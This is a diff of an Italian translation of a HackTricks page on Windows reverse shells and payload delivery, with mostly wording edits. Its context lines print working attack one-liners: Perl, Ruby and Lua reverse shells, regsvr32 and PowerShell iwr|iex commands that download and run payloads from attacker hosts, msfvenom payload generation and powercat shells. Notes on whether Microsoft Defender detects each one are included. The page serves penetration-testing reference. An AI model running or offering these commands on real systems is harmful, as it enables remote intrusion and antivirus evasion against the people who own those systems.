@@ -2,11 +2,11 @@
 
 <details>
 
-<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>
 
 Altri modi per supportare HackTricks:
 
-* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
@@ -16,7 +16,7 @@ Altri modi per supportare HackTricks:
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -61,8 +61,6 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen(
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
-
-Lua è un linguaggio di scripting leggero e potente che può essere incorporato in applicazioni per fornire flessibilità e automazione. È ampiamente utilizzato per estendere funzionalità e personalizzare il comportamento di software e giochi. Lua è noto per la sua semplicità, velocità ed efficienza.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -94,7 +92,7 @@ Payload scritto su disco: **NO** (_almeno da nessuna parte che ho potuto trovare
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-Processo che effettua la chiamata di rete: **svchost.exe**\
+Processo che effettua chiamate di rete: **svchost.exe**\
 Payload scritto su disco: **cache locale del client WebDAV**
 
 **One liner:**
@@ -230,7 +228,7 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-**Rilevato da Defender**
+**Rilevato dal difensore**
 
 #### Regsvr32 -sct
 
@@ -285,7 +283,7 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
-**Rilevato da Defender**
+**Rilevato dal difensore**
 
 ## PS-Bat
 ```bash
@@ -336,7 +334,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 **Non rilevato**
 
-**Puoi scaricare ed eseguire molto facilmente uno zombie Koadic utilizzando lo stager wmic**
+**È possibile scaricare ed eseguire molto facilmente uno zombie Koadic utilizzando lo stager wmic**
 
 ## Msbuild
 
@@ -397,7 +395,7 @@ powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
 Defender non lo rileva come codice maligno (almeno fino al 3/04/2019).
 
-**TODO: Controllare altre shell nishang**
+**TODO: Controllare altre shell di nishang**
 
 ### **PS-Powercat**
 
@@ -411,7 +409,7 @@ Defender non lo rileva come codice maligno (ancora, 3/04/2019).
 
 **Altre opzioni offerte da powercat:**
 
-Shell di bind, Shell inversa (TCP, UDP, DNS), Reindirizzamento di porta, upload/download, Generare payload, Servire file...
+Shell di bind, Shell inversa (TCP, UDP, DNS), Reindirizzamento di porta, caricamento/scaricamento, Generare payload, Servire file...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -436,7 +434,7 @@ Crea un lanciatore powershell, salvandolo in un file e scaricalo ed eseguilo.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Rilevato come codice dannoso**
+**Codice rilevato come dannoso**
 
 ### MSF-Unicorn
 
@@ -450,11 +448,11 @@ Avvia msfconsole con la risorsa creata:
 ```
 msfconsole -r unicorn.rc
 ```
-Avvia un server web che serve il file _powershell\_attack.txt_ e esegui nel computer della vittima:
+Avvia un server web che serve il file _powershell\_attack.txt_ e esegui nella vittima:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**Rilevato come codice maligno**
+**Codice rilevato come maligno**
 
 ## Altro
 
@@ -474,7 +472,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) console PS con alcuni moduli P
 ​
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -484,9 +482,9 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) console PS con alcuni moduli P
 
 Altri modi per supportare HackTricks:
 
-* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
+* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.
 
